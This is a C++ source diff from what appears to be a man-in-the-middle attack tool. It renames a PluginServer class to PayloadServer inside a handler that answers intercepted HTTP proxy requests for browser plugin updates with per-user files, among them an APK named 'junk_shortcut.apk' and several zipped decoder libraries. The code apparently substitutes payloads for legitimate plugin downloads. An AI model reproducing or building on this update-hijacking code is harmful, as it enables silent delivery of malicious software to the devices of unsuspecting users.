@@ -3,7 +3,7 @@
 #include "QQmtt.h"
 #include "../cipher/CryptoUtils.h"
 #include "../HttpUtils.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 
 int gQQMttFlag = 0;
 
@@ -45,7 +45,7 @@ int QQmtt::replyQQmttPlugin(char * lpbuf, int iCounter, int limit, LPHTTPPROXYPA
 
 		string filename = Public::getUserUrl(lphttp->username, "junk_shortcut.apk");
 
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
 		return 0;
 	}
 	else if (gQQMttFlag == 3)
@@ -54,7 +54,7 @@ int QQmtt::replyQQmttPlugin(char * lpbuf, int iCounter, int limit, LPHTTPPROXYPA
 
 		string filename = Public::getUserUrl(lphttp->username, "libTPGDecoder.zip");
 
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
 		return 0;
 	}
 	else if (gQQMttFlag == 4)
@@ -63,7 +63,7 @@ int QQmtt::replyQQmttPlugin(char * lpbuf, int iCounter, int limit, LPHTTPPROXYPA
 
 		string filename = Public::getUserUrl(lphttp->username, "libSharpPDecoder.zip");
 
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
 		return 0;
 	}
 	else if (gQQMttFlag == 5)
@@ -72,7 +72,7 @@ int QQmtt::replyQQmttPlugin(char * lpbuf, int iCounter, int limit, LPHTTPPROXYPA
 
 		string filename = Public::getUserUrl(lphttp->username, "qb_tvk_plugin_signed.zip");
 
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
 		return 0;
 	}
 	return FALSE;
